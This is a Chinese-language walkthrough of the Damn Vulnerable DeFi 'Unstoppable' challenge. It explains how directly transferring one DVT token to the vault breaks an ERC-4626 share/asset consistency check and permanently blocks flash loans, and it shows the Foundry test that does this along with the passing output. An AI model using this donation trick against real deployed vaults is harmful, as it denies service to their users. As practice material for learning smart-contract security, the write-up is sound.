## 题目 [Unstoppable](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/unstoppable)
有一个 token 化的金库合约，里面存放了一百万个 DVT 代币。在宽限期结束之前，它会免费提供闪电贷服务。  

为了在完全丢弃权限之前找出潜在的漏洞，开发者们决定在测试网上进行实况测试。为此，他们部署了一个监控合约，用于检查闪电贷功能的活跃状态。  

从只有 10 个 DVT 代币的余额开始，展示如何让这个金库合约停止运行。目标是让它无法继续提供闪电贷服务。  

**解释：** 题目的意思是需要让合约无法正常的提供闪电贷服务，即修改一些条件，导致即使正常调用闪电贷函数，也会失败。

## 合约分析
一共有两个合约文件 [UnstoppableVault](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.0.0/src/unstoppable/UnstoppableVault.sol) 和 [UnstoppableMonitor](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.0.0/src/unstoppable/UnstoppableMonitor.sol)。其中，`UnstoppableVault` 合约是提供闪电贷服务的金库，而 `UnstoppableMonitor` 合约则用于监控合约的闪电贷功能。重点在于 `UnstoppableVault` 合约中的 `flashLoan` 函数。
``` solidity
    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }
```
函数中有四个检查条件：
1. `amount` 参数不能为零。
2. 借贷的代币必须是金库的标的代币，在这个例子中即为DVT代币。
3. `convertToShares(totalSupply)` 必须等于 `balanceBefore()`。
4. 闪电贷操作是否成功，通过借贷者合约的 `onFlashLoan` 方法返回的 `magic value` 进行验证。

其中，1、2、4 三个条件相对直观，我们重点分析第 3 个条件。涉及到的函数和变量如下：  
``` solidity
    // 标的代币（DVT）
    ERC20 public immutable asset;

    // 总份额（tDVT）
    uint256 public totalSupply;

    function totalAssets() public view override nonReadReentrant returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view virtual returns (uint256) {
        // 常见省 gas 方式：先将 totalSupply 存入内存，减少 SLOAD 操作。
        uint256 supply = totalSupply; 

        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    }
```
`convertToShares` 函数用于将资产数量转换为份额数量，通过公式 $\frac{\text{Total Assets}}{\text{Total Shares}} = \frac{\text{Assets}}{\text{Shares}}$ 计算出 $Shares$ 。因此，检查条件 3 的目的是验证合约的内部状态是否一致，确保 `totalSupply` 转化为的资产数量与金库中的实际资产总量一致，避免通过非正常手段操作合约资产。

不过，此处难道不是应该使用 `convertToAssets` 函数吗，将总份额转换为总资产数量。此处先存疑...    
## 题解
基于上述分析，我们可以得出解决方法：直接向金库合约中转入额外的DVT代币，从而打破代币数量的对应性，使检查条件失败，进而阻止闪电贷功能的运行。  

**测试代码：**
``` solidity
    function test_unstoppable() public checkSolvedByPlayer {
        require(token.transfer(address(vault), 1));
    }
```
**运行测试：**
```
forge test --mp test/unstoppable/Unstoppable.t.sol
```
**测试通过：**
```
Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_assertInitialState() (gas: 57390)
[PASS] test_unstoppable() (gas: 67067)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 17.81ms (4.26ms CPU time)
```

## 相关知识
### ERC-4626
ERC-4626 是一个标准化API，用于让用户控制并执行Vault功能，并通过ERC-20代币进行交互。该标准建立在ERC-20之上，核心功能包括向Vault存入资金、查询Vault内的资金状态、股份和资产的兑换，以及对Vault进行资金管理的功能（如存款、提款、铸币和赎回）。

更多内容可参考：  
[ERC-4626: Tokenized Vaults | eips.ethereum.org/](https://eips.ethereum.org/EIPS/eip-4626)  
[ERC-4626 Tokenized Vault Standard | ethereum.org](https://ethereum.org/zh/developers/docs/standards/tokens/erc-4626/)

### ERC-3156
ERC-3156 定义了一个统一的闪电贷标准，旨在支持各种不同的借贷机制。许多协议提供闪电贷服务，如dYdX、Aave和Uniswap，但它们的接口各不相同。ERC-3156 的提出为开发者提供了一种标准化的方法，减少了学习成本，并增强了dApp的安全性。  

更多信息请参见：  
[ERC-3156: Flash Loans | eips.ethereum.org/](https://eips.ethereum.org/EIPS/eip-3156)

